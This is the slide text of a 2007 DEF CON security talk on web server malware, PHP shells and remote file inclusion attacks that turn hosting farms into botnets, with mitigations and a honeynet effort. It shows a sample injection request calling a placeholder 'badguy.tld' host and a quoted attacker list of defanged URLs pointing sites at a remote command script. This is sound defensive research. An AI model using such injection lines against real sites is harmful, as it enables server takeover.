Web server botnets  and hosting 
farms as attack platforms
Gadi Evron – Beyond Security
defcon 15 , 2007
About me
 Who I am..
 What do I do..
 Where do I work..
Regular malware
Often…
 Platform specific (Architecture, OS)
 Propagates by the use of:
 Vulnerabilities (web server, mail client, remote 
accessible service)
 Social engineering (user “gullibility”)
 Propagates randomly (++)
 Affects desktops (++)
Web server malware
Often…
 Completely cross-platform (any web daemon 
supporting scripting languages)
 Propagates by the use of Google (and 
sometimes other search engines –
"Powered by phpBB" )
 Propagates from a pre-selected genetic pool 
(++)
 Affects servers (++)
Which means…
Malware and Bots
Web server malware is cross-platform and up 
to now infected an astounding number of web 
servers ready to be commanded in botnets.
Attack platforms (lotsa web servers)
Collocation facilities, ISP server farms, hosting 
providers, etc.
Previous work
 PHP shells – generally explored
 File inclusion attacks (RFI) – Thoroughly 
explored
 R57shell analysed (SpamThru by Joe 
Stewart, SecureWorks – formerly LURHQ)
Non other significant work done in this field up 
to a few months ago when this paper was 
written.
New work
 “Web server botnets and server farms as 
attack platforms (Kfir Damari, Noam Rathaus
and myself. Virus Bulletin, February 1, 2007).
 “Know your Enemy: Web Application 
Threats”, Jamie Riden, Ryan McGeehan, 
Brian Engert, Michael Mueter. The Honeynet
Project, February 7, 2007).
The injection
 File inclusions are vulnerabilities in web applications 
which can allow an attacker to execute a script by 
including the file in an existing script, as an example 
by the use of the include() function in PHP. 
 In some cases other types of vulnerabilities in web 
applications are also used, such as URL parsing 
code execution vulnerabilities, POST vulnerbailities
and arbitrary file upload vulnerabilities.
What an injection looks like
The attack, in the form of an HTTP request:
index.php?page=http://badguy.tld/ 
malware.cmd?cmd=ls
The resulting PHP code:
causes the web server to act like a client and 
download the software in question.
Main types of web server malware
 Foothold grabbers (beachhead)
 Remote shell (elaborate compromise tool)
 Bot
Main uses for web server malware
 Anonymous messaging
 Spam
 Defacement
 Botnets
See the “load DB” option? 
Example
OwneD By [GaspeR]`- Group ShellBR
Server: irc.undernet.org Canal: #ShellBRAconcelho a 
Quem For Testar As Shell`s Que mude As Cmd`s ! 
hxxp://wxw.che.yzu.edu.tw/Menu12/index.php?id=hxxp://sh 
ellbr.by.ru/cmd.txt?
hxxp://wxw.cheapcheapsale.com/index.php3?function=hxxp: 
//shellbr.by.ru/cmd.txt?
hxxp://wxw.chentaiji.pl/index.php?id=hxxp://shellbr.by. 
ru/cmd.txt?hxxp://wxw.chessitc.com/index.php?pagina=h 
xxp://shellbr.by.ru/cmd.txt?
..
..
Example #2
 New malware discovered:
 New version of C99shell
 Google:
C99Shell tool, modified by Psych0
(other new malware also discovered, currently in DB 
– 243 samples)
Example #3
Quoting, as the guy was excited:
‘This on its own isn't new, but rather the way 
the program is delivered. By using PHP's 
'eval' function the new variant hides itself in a 
base64 encoded block of data, which is also 
"encrypted" - the characters are rotated so 
that they don't appear to be in "plain text".’
Interesting thing about #2
 C&C channel … (or..?)
Google search:
c100.php
Attack platforms?
Low-cost hosting –
 2-3K web sites per box.
 Any user can run any web application
 Web applications running on these are mostly 
PHP (open source availability)
 PHP has a ton of vulnerabilities (no, 
really?!?!) – open source availability, PHP is 
PHP is PHP is bad security and ugly code.
Attack platforms?
3000 users…
 Any web application or script will run with the 
permissions of the web daemon
 Local exploits are abound (privilage
escalation exploits for Linux kernel seen in 
one family especially – DDoS tools)
Attack platforms?
 Detection
 VA scanning
 Look for known “bads” on system
 Patching
 User responsibility (may take time, “may” not happen)
 A patch may not exist
 Investment
 Contact user (just one?)
 Patch web site
 Clean server (not just web site)
All imperfect, and mostly can’t fit a low-cost (or higher cost) hosting 
solution.
Solutions?
 Disable in PHP: allow_url_fopen, 
allow_url_include
 Virtual environments/chrooted users – cost?
 Best practices – don’t allow surfing from a 
web server! – gonna last how long as a 
solution…?
 mod_security?
 Best practices – your own?
 Quietly patch known web applications? ☺
Boiling it down
 A battlefield with no escalation by good guys
(Over-time, aggregated attacker IP 
addresses the same in over 85% of the 
cases).
Can currently be compared to SMTP spam 
open relay days.
The Web Honeynet
Task Force
 14 current members, among which are 2 of 
the biggest colos and hosting farms in the 
world.
 Allows for:
 Malware gathering
 C&C discovery
 IP blacklists
 URL blacklists
 Web server anti virus? ☺
 Joining ☺ (and some new members)
Impact
IIS botnets
Linux botnets
New game
Lotsa (from obvious to.. Not so much):
Defacements, spam bots, .., and stolen 
databases.
It’s about…
 The scale
 The cost
 The fact the bad guys just do what they want 
with close to no industry or community 
awareness
 Questions?